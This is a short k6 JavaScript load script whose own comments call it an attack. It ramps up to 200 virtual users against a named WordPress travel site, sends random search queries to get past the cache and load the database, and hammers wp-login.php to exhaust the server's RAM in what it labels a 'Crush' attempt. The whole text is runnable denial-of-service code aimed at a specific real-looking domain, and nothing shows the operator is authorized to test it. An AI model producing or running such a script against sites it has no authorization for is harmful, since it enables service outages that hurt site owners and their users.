import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  stages: [
    { duration: '1m', target: 50 },  // Level 1: Standard traffic
    { duration: '2m', target: 200 }, // Level 2: The "Crush" attempt
    { duration: '1m', target: 0 },   // Level 3: Ramp down
  ],
};

export default function () {
  const TARGET_URL = 'https://lordtravelcorfu.gr/'; // <--- CHANGE THIS

  // ATTACK 1: The Cache Bypass (Method 1)
  // We use a random query to force the database to search, bypassing static cache.
  let searchRes = http.get(`${TARGET_URL}/?s=${Math.random().toString(36).substring(7)}`);
  check(searchRes, { 'Search status 200': (r) => r.status === 200 });

  // ATTACK 2: The Login Heavy-Lifter (Method 2)
  // wp-login.php is PHP-heavy. Opening it 200 times at once will eat RAM.
  let loginRes = http.get(`${TARGET_URL}/wp-login.php`);
  check(loginRes, { 'Login Page status 200': (r) => r.status === 200 });

  sleep(1);
}